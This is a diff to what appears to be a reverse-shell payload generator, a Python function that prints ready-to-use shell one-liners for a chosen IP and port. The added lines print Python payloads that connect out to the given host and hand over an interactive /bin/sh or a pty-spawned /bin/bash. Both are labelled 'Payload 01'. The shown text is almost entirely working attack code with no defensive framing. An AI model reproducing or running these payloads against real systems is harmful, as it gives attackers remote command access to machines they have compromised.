@@ -42,7 +42,9 @@ def print_shell(ip,port,choice):
 		
 	elif(choice == '2'):
 		print(Fore.BLUE, '[+] Python Payload')
-		print(Fore.WHITE + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
+		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
+		print(Fore.WHITE + f'')
+		print(Fore.RED, 'Payload 01 => ', Fore.WHITE + '\n' + f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn([\"/bin/bash\"]);'")
 
 	elif(choice == '3'):
 		print(Fore.BLUE, '[+] Perl Payload')
